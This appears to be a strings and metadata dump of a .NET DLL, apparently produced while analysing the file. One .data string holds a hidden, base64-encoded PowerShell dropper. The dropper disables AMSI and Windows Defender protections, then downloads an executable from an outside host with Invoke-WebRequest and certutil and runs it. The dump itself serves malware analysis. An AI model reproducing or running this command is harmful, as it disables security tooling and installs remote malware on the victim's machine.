Metadata Signature: 0x11160 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: a0
Stream name: #~ 4
DirectoryAddress: 10c Size: 68
Stream name: #Strings 12
DirectoryAddress: 174 Size: 8
Stream name: #US 4
DirectoryAddress: 17c Size: 10
Stream name: #GUID 8
DirectoryAddress: 18c Size: 10
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1068 0x00012136 0x10012d36 11   12   .rdata  ascii   CreateFileW
1069 0x00012144 0x10012d44 13   14   .rdata  ascii   WriteConsoleW
1070 0x00012154 0x10012d54 13   14   .rdata  ascii   DecodePointer
1071 0x00012164 0x10012d64 11   12   .rdata  ascii   _CorDllMain
1072 0x00012170 0x10012d70 11   12   .rdata  ascii   mscoree.dll
1073 0x00012200 0x10013000 1849 1850 .data   ascii   powershell.exe -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAGQAYQByAGsALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGQAYQByAGsALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AZABhAHIAawAuAGUAeABlACAAOwAgAC4AXABkAGEAcgBrAC4AZQB4AGUA
1074 0x00012a0a 0x1001380a 26   27   .data   ascii                             
1075 0x00012aea 0x100138ea 26   27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1076 0x00012b0a 0x1001390a 26   27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1077 0x00012c12 0x10013a12 26   27   .data   ascii                             
1078 0x00012cf9 0x10013af9 26   27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1079 0x00012d19 0x10013b19 26   27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1080 0x00013208 0x10015008 4    5    .reloc  ascii   \n0u0
1081 0x00013219 0x10015019 7    8    .reloc  ascii   0A1I1|1
1082 0x00013227 0x10015027 5    6    .reloc  ascii   1,2>2
1083 0x0001322d 0x1001502d 5    6    .reloc  ascii   2:3T3
1084 0x0001323f 0x1001503f 11   12   .reloc  ascii   4\e4!4'43494
1085 0x0001324b 0x1001504b 5    6    .reloc  ascii   4T5t5
1086 0x00013255 0x10015055 23   24   .reloc  ascii   5\r6$6*60666<6B6H6]6r6y6
1087 0x00013275 0x10015075 5    6    .reloc  ascii   747G7
1088 0x0001327b 0x1001507b 13   14   .reloc  ascii   838=8V8_8d8w8
1089 0x000132a1 0x100150a1 11   12   .reloc  ascii   :&:/:D:M:|:
1090 0x000132c3 0x100150c3 25   26   .reloc  ascii   ;,;:;@;F;L;R;X;_;f;m;t;{;
1091 0x000132fd 0x100150fd 9    10   .reloc  ascii   =G=O=a=n=
1092 0x00013329 0x10015129 7    8    .reloc  ascii   2B2W2q2
1093 0x0001333b 0x1001513b 15   16   .reloc  ascii   3 3*343B3]3n3z3
1094 0x00013355 0x10015155 5    6    .reloc  ascii   3T4g4
1095 0x0001335d 0x1001515d 5    6    .reloc  ascii   4A6x6
1096 0x0001336d 0x1001516d 11   12   .reloc  ascii   6+7074787<7
1097 0x00013383 0x10015183 9    10   .reloc  ascii   9&:9:a:|:
1098 0x000133a5 0x100151a5 19   20   .reloc  ascii   ;!;-;2;7;U;_;k;p;u;
1099 0x000133d3 0x100151d3 17   18   .reloc  ascii   ?%?/?B?I?U?m?r?~?
1100 0x000133f0 0x100151f0 4    5    .reloc  ascii   f0m0
1101 0x00013403 0x10015203 5    6    .reloc  ascii   1#1O1
1102 0x0001340d 0x1001520d 15   16   .reloc  ascii   1"2+2d2o2Z4d4}4
1103 0x00013453 0x10015253 15   16   .reloc  ascii   9(9.999?9M9[9n9
1104 0x0001346d 0x1001526d 5    6    .reloc  ascii   9\f:):
1105 0x00013475 0x10015275 15   16   .reloc  ascii   : ;(;/;y<g=q=~=
1106 0x0001348b 0x1001528b 9    10   .reloc  ascii   =->P>W>j>
1107 0x000134b3 0x100152b3 13   14   .reloc  ascii   244A4V4a4l4~4
1108 0x000134c7 0x100152c7 5    6    .reloc  ascii   4.5I5
1109 0x000134d9 0x100152d9 5    6    .reloc  ascii   ;@<q<
1110 0x000134eb 0x100152eb 9    10   .reloc  ascii   ?*?D?\?c?
1111 0x00013509 0x10015309 9    10   .reloc  ascii   010X0m0}0
1112 0x0001351d 0x1001531d 11   12   .reloc  ascii   1+181Q1b1l1
1113 0x0001353b 0x1001533b 5    6    .reloc  ascii   2:2A2
1114 0x00013547 0x10015347 9    10   .reloc  ascii   3h6N7,8S8
1115 0x00013567 0x10015367 15   16   .reloc  ascii   <%<,<F<U<_<l<v<
1116 0x0001357b 0x1001537b 7    8    .reloc  ascii   =<=+?N?
1117 0x00013594 0x10015394 18   19   .reloc  ascii   >0G0K0Q0U0[0_0i0|0
1118 0x000135b3 0x100153b3 7    8    .reloc  ascii   1\f2W2|3
1119 0x000135c3 0x100153c3 5    6    .reloc  ascii   4\b5v5
1120 0x000135cd 0x100153cd 11   12   .reloc  ascii   6 6,6=6K6V6
1121 0x000135d9 0x100153d9 5    6    .reloc  ascii   7p8v8
1122 0x000135e1 0x100153e1 13   14   .reloc  ascii   8W9\9a9q9v9{9
1123 0x00013603 0x10015403 7    8    .reloc  ascii   :*:@:f:
1124 0x00013619 0x10015419 5    6    .reloc  ascii   ;6;Z;
1125 0x00013631 0x10015431 15   16   .reloc  ascii   </<><I<N<S<n<}<
1126 0x00013653 0x10015453 5    6    .reloc  ascii   =>=b=
1127 0x0001366b 0x1001546b 5    6    .reloc  ascii   >&>^>
1128 0x00013677 0x10015477 5    6    .reloc  ascii   ?.?b?
1129 0x0001368c 0x1001548c 4    5    .reloc  ascii   *0Z0
1130 0x00013699 0x10015499 9    10   .reloc  ascii   1\f1B1`1k1
1131 0x000136ab 0x100154ab 11   12   .reloc  ascii   1=2B2G2L2U2
1132 0x000136c3 0x100154c3 11   12   .reloc  ascii   3F4N4f4t4|4
1133 0x000136d1 0x100154d1 17   18   .reloc  ascii   4-5G5L527L7[7i7u7
1134 0x000136f1 0x100154f1 11   12   .reloc  ascii   8$828=8S8g8
1135 0x00013705 0x10015505 9    10   .reloc  ascii   9$:.:Q:[:
1136 0x00013715 0x10015515 5    6    .reloc  ascii   :\t;c;
1137 0x0001372f 0x1001552f 5    6    .reloc  ascii   334]4
1138 0x00013737 0x10015537 7    8    .reloc  ascii   4,5C5c5
1139 0x00013769 0x10015569 7    8    .reloc  ascii   0*101X1
1140 0x00013773 0x10015573 5    6    .reloc  ascii   1O2i2
1141 0x00013783 0x10015583 11   12   .reloc  ascii   3!3=3D3[3q3
1142 0x00013795 0x10015595 5    6    .reloc  ascii   4H4{4
1143 0x0001379d 0x1001559d 7    8    .reloc  ascii   4\v5!5p5
1144 0x000137b1 0x100155b1 5    6    .reloc  ascii   788r8
1145 0x000137e3 0x100155e3 7    8    .reloc  ascii   =2=Q=*>
1146 0x000137ed 0x100155ed 5    6    .reloc  ascii   ?#?w?
1147 0x0001381b 0x1001561b 11   12   .reloc  ascii   3.3@3R3d3v3
1148 0x00013857 0x10015657 7    8    .reloc  ascii   > >2>z>
1149 0x00013861 0x10015661 7    8    .reloc  ascii   ?,?5?>?
1150 0x00013881 0x10015681 9    10   .reloc  ascii   0+0J0P0^0
1151 0x00013897 0x10015697 5    6    .reloc  ascii   1O2T2
1152 0x000138a9 0x100156a9 11   12   .reloc  ascii   2A3M3a3m3y3
1153 0x000138bb 0x100156bb 11   12   .reloc  ascii   4/4?4K4Z4m5
1154 0x000138cb 0x100156cb 7    8    .reloc  ascii   646H6S6
1155 0x000138d3 0x100156d3 5    6    .reloc  ascii   6)7l7
1156 0x000138df 0x100156df 5    6    .reloc  ascii   969F9
1157 0x000138f1 0x100156f1 9    10   .reloc  ascii   :M;X;^;g;
1158 0x00013905 0x10015705 5    6    .reloc  ascii   ;(<C<
1159 0x00013919 0x10015719 7    8    .reloc  ascii   =9>K>]>
1160 0x00013945 0x10015745 5    6    .reloc  ascii   7v:{:
1161 0x00013964 0x10015764 24   25   .reloc  ascii   $14181<1H1L1P1d1h1l1p1x1
1162 0x000139a3 0x100157a3 25   26   .reloc  ascii   2 2(20282@2H2P2X2`2h2p2x2
1163 0x000139e3 0x100157e3 25   26   .reloc  ascii   3 3(30383@3H3P3X3`3h3p3x3
1164 0x00013a23 0x10015823 25   26   .reloc  ascii   4 4(40484@4H4P4X4`4h4p4x4
1165 0x00013a65 0x10015865 39   40   .reloc  ascii   = =$=(=,=0=4=<=@=D=H=L=P=T=X=d=l=t=x=|=
1166 0x00013a8f 0x1001588f 5    6    .reloc  ascii   =\b?\f?
1167 0x00013a97 0x10015897 29   30   .reloc  ascii   ?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
1168 0x00013ac8 0x100158c8 4    5    .reloc  ascii   x4|4
1169 0x00013b0f 0x1001590f 5    6    .reloc  ascii   5\b5\f5
1170 0x00013b1b 0x1001591b 45   46   .reloc  ascii   5 5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
1171 0x00013b75 0x10015975 17   18   .reloc  ascii   5D?L?T?\?d?l?t?|?
1172 0x00013bb7 0x100159b7 25   26   .reloc  ascii   0$0,040<0D0L0T0\0d0l0t0|0
1173 0x00013bf7 0x100159f7 25   26   .reloc  ascii   1$1,141<1D1L1T1\1d1l1t1|1
1174 0x00013c37 0x10015a37 25   26   .reloc  ascii   2$2,242<2D2L2T2\2d2l2t2|2
1175 0x00013c77 0x10015a77 25   26   .reloc  ascii   3$3,343<3D3L3T3\3d3l3t3|3
1176 0x00013cb7 0x10015ab7 25   26   .reloc  ascii   4$4,444<4D4L4T4\4d4l4t4|4
1177 0x00013cf7 0x10015af7 25   26   .reloc  ascii   5$5,545<5D5L5T5\5d5l5t5|5
1178 0x00013d37 0x10015b37 17   18   .reloc  ascii   6$6,646<6D6L6T6\6
1179 0x00013d50 0x10015b50 6    7    .reloc  ascii   h0p0x0
1180 0x00013d7d 0x10015b7d 25   26   .reloc  ascii   1 1(10181@1H1P1X1`1h1p1x1
1181 0x00013dbd 0x10015bbd 25   26   .reloc  ascii   2 2(20282@2H2P2X2`2h2p2x2
1182 0x00013dfd 0x10015bfd 25   26   .reloc  ascii   3 3(30383@3H3P3X3`3h3p3x3
1183 0x00013e3d 0x10015c3d 25   26   .reloc  ascii   4 4(40484@4H4P4X4`4h4p4x4
1184 0x00013e7d 0x10015c7d 25   26   .reloc  ascii   5 5(50585@5H5P5X5`5h5p5x5
1185 0x00013ebd 0x10015cbd 25   26   .reloc  ascii   6 6(60686@6H6P6X6`6h6p6x6
1186 0x00013efd 0x10015cfd 25   26   .reloc  ascii   7 7(70787@7H7P7X7`7h7p7x7
1187 0x00013f20 0x10015d20 4    5    .reloc  ascii   z1~1
1188 0x00013f4d 0x10015d4d 21   22   .reloc  ascii   ;$;,;4;<;D;L;T;\;d;l;
1189 0x00013f67 0x10015d67 5    6    .reloc  ascii   <@=X=
1190 0x00013f77 0x10015d77 15   16   .reloc  ascii   3\f3$3(3D3H3d3h3
1191 0x00013f91 0x10015d91 9    10   .reloc  ascii   3\b4(4H4h4
1192 0x00013fa1 0x10015da1 9    10   .reloc  ascii   4\b5(5H5h5
1193 0x00013fb1 0x10015db1 9    10   .reloc  ascii   5\b6(6H6h6
1194 0x00013fd5 0x10015dd5 51   52   .reloc  ascii   = =8=D=H=L=h=l=(>,>0>4>8><>@>D>H>L>X>\>`>d>h>l>p>t>

